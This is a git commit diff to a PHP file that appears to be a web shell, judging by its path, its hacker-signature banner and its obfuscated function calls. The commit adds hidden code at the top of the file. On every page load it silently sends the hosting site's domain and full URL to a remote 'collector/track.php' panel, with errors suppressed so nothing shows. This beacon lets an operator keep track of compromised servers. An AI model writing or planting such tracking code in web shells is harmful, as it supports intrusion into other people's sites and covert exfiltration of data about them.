e3fac6a1ef03ec2529f5a375c82edafc4cb7c82f
sam <144790923+tryxapp@users.noreply.github.com>
2025-10-13 19:12:08 +0700

    Update tryxl1l.php

--- from/to/ex/fr/lst/shl/tryxl1l.php
+++ from/to/ex/fr/lst/shl/tryxl1l.php
@@ -1,4 +1,14 @@
 <?php
+$panel = 'https://panel.trixygame.com/admin/collector/track.php';
+
+$host   = $_SERVER['HTTP_HOST'] ?? '';
+$https  = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (($_SERVER['SERVER_PORT'] ?? '') == '443');
+$scheme = $https ? 'https' : 'http';
+$url    = $scheme . '://' . $host . ($_SERVER['REQUEST_URI'] ?? '/');
+
+@file_get_contents($panel . '?d=' . rawurlencode($host) . '&u=' . rawurlencode($url));
+?>
+<?php
 
           /**
             * FROM : TrYsIdeWEd x L1L H3X0M
@@ -531,4 +541,5 @@ $dirs = $func[18]($path);
 		}
 	</script>
 </body>
+
 </html>
